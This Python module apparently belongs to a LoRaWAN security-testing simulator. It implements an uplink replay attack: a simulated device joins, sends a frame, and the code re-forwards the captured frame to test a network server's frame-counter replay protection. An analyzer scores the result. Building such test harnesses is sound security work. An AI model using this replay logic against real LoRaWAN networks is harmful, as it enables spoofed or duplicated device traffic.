"""Replay attack implementation."""

from __future__ import annotations

import time
from logging import Logger
from typing import TYPE_CHECKING, Any

from attacks.analyzer import AttackAnalyzer
from attacks.base import AttackConfig, BaseAttack
from attacks.packet_capture import CapturedPacket, PacketCapture
from attacks.validation import validate_criteria
from simulator.lifecycle.join_helper import perform_otaa_join
from lorawan.device.model import SimulatedDevice
from lorawan.gateway.model import GatewaySimulator
from lorawan.scenario.schema import RadioMetadata

if TYPE_CHECKING:
    from lorawan.scenario.schema_v1 import ExpectedBehavior


class ReplayAnalyzer(AttackAnalyzer):
    """Analyzer for replay attack results."""
    
    def analyze(
        self, capture: PacketCapture, expected: ExpectedBehavior | None = None
    ) -> dict[str, Any]:
        """
        Analyze replay attack results.
        
        Checks if:
        - Original uplink was sent
        - Replay was injected
        - Network Server accepted or rejected replay
        - FCnt validation worked correctly
        """
        stats = capture.get_stats()
        
        if stats["total_uplinks"] < 2:
            return {
                "success": False,
                "message": "Replay attack did not execute (insufficient uplinks captured)",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }
        
        # Find original and replayed packets
        original = None
        replays = []
        
        for i, packet in enumerate(capture.uplinks):
            if i == 0:
                original = packet
            elif packet.phy_payload == original.phy_payload:
                replays.append(packet)
        
        if not replays:
            return {
                "success": False,
                "message": "No replay packets detected",
                "metrics": {
                    "uplinks_captured": stats["total_uplinks"],
                    "original_fcnt": original.fcnt if original else None,
                },
            }
        
        # Analyze Network Server response
        # In a real scenario, we'd check for:
        # - Downlink responses to replay
        # - Error messages
        # - Session state changes
        
        # Build metrics
        metrics = {
            "original_fcnt": original.fcnt if original else None,
            "replays_count": len(replays),
            "replays_sent": len(replays),  # Alias for compatibility
            "total_uplinks": stats["total_uplinks"],
            "total_downlinks": stats["total_downlinks"],
            "time_between_original_and_first_replay": (
                replays[0].timestamp - original.timestamp if replays and original else 0
            ),
        }
        
        # Base result
        result = {
            "success": True,
            "message": f"Replay attack executed: {len(replays)} replay(s) sent",
            "metrics": metrics,
        }
        
        # Add validation results if expected behavior provided
        if expected:
            validation = validate_criteria(
                attack_type="uplink_replay",
                criteria=expected.success_criteria,
                metrics=metrics,
                capture_stats=stats,
                secure_behavior=expected.secure_behavior,
            )
            
            result.update(validation.to_dict())
            result["validation_summary"] = validation.get_summary()
        
        return result


class ReplayAttack(BaseAttack):
    """
    Replay attack implementation.
    
    Captures legitimate uplink packets and replays them to test:
    - Frame counter validation
    - Replay protection mechanisms
    - Duplicate packet handling
    """
    
    def __init__(
        self,
        config: AttackConfig,
        device: SimulatedDevice,
        gateway: GatewaySimulator,
        logger: Logger,
        radio: RadioMetadata,
        replay_mode: str = "immediate",
        delay_sec: float = 0.0,
        burst_count: int = 1,
        burst_interval_sec: float = 0.1,
    ) -> None:
        super().__init__(config, device, gateway, logger)
        self.radio = radio
        self.replay_mode = replay_mode
        self.delay_sec = delay_sec
        self.burst_count = burst_count
        self.burst_interval_sec = burst_interval_sec
        self._captured_uplink: CapturedPacket | None = None
    
    def _create_analyzer(self) -> AttackAnalyzer:
        """Create replay-specific analyzer."""
        return ReplayAnalyzer()
    
    def setup(self) -> None:
        """
        Setup phase: establish session and send legitimate uplink.
        
        Steps:
        1. Start gateway
        2. Device performs OTAA join (with proper JoinAccept handling)
        3. Device sends legitimate uplink
        4. Capture the uplink for replay
        """
        self.logger.info("Replay attack setup: starting gateway")
        self.gateway.start()
        
        # Wait for gateway to be ready
        time.sleep(0.5)
        
        # Perform OTAA join with proper JoinAccept handling
        self.logger.info("Replay attack setup: device joining")
        join_success = perform_otaa_join(
            device=self.device,
            gateway=self.gateway,
            radio=self.radio,
            capture=self.capture,
            logger=self.logger,
            timeout_sec=5.0,
            metadata={"phase": "setup"}
        )
        
        if not join_success:
            self.logger.error("OTAA join failed - cannot proceed with replay attack")
            raise RuntimeError("Device failed to join network")
        
        # Send legitimate uplink
        self.logger.info("Replay attack setup: sending legitimate uplink")
        try:
            payload = bytes.fromhex("01020304")
            uplink = self.device.build_data_uplink(payload=payload, f_port=10, confirmed=False)
            
            self._captured_uplink = self.capture.capture_uplink(
                phy_payload=uplink,
                fcnt=self.device.runtime.fcnt_up - 1,  # fcnt was incremented
                packet_type="data_up",
                metadata={"phase": "setup", "legitimate": True},
            )
            
            self.gateway.forward_uplink(uplink, self.radio)
            self.logger.info(
                f"Legitimate uplink sent with FCnt={self._captured_uplink.fcnt}",
                extra={"fcnt": self._captured_uplink.fcnt},
            )
        except RuntimeError as e:
            self.logger.warning(f"Could not build data uplink: {e}")
            # For demo purposes, create a dummy packet
            self._captured_uplink = self.capture.capture_uplink(
                phy_payload=b"\x40\x00\x00\x00\x00\x00\x00\x00",
                fcnt=0,
                packet_type="data_up",
                metadata={"phase": "setup", "legitimate": True, "dummy": True},
            )
        
        # Wait for potential downlink response
        time.sleep(0.5)
    
    def execute(self) -> None:
        """
        Execute replay attack.
        
        Replays the captured uplink based on configured mode:
        - immediate: replay immediately
        - delayed: wait delay_sec before replay
        - burst: send multiple replays in quick succession
        """
        if not self._captured_uplink:
            raise RuntimeError("No uplink captured to replay")
        
        self.logger.info(
            f"Executing replay attack: mode={self.replay_mode}",
            extra={
                "mode": self.replay_mode,
                "delay_sec": self.delay_sec,
                "burst_count": self.burst_count,
            },
        )
        
        # Apply delay if configured
        if self.replay_mode == "delayed":
            self.logger.info(f"Delaying replay by {self.delay_sec}s")
            time.sleep(self.delay_sec)
        
        # Execute replay(s)
        replays_to_send = self.burst_count if self.replay_mode == "burst" else 1
        
        for i in range(replays_to_send):
            self.logger.info(
                f"Injecting replay {i + 1}/{replays_to_send}",
                extra={"replay_number": i + 1, "total": replays_to_send},
            )
            
            # Capture the replay
            self.capture.capture_uplink(
                phy_payload=self._captured_uplink.phy_payload,
                fcnt=self._captured_uplink.fcnt,
                packet_type="data_up",
                metadata={
                    "phase": "execute",
                    "replay": True,
                    "replay_number": i + 1,
                    "original_timestamp": self._captured_uplink.timestamp,
                },
            )
            
            # Send replay through gateway
            self.gateway.forward_uplink(self._captured_uplink.phy_payload, self.radio)
            
            # Wait between burst replays
            if i < replays_to_send - 1:
                time.sleep(self.burst_interval_sec)
        
        self.logger.info(f"Replay attack executed: {replays_to_send} replay(s) sent")
        
        # Wait for potential Network Server responses
        time.sleep(1.0)
    
    def teardown(self) -> None:
        """Teardown: stop gateway and cleanup."""
        self.logger.info("Replay attack teardown: stopping gateway")
        self.gateway.stop()
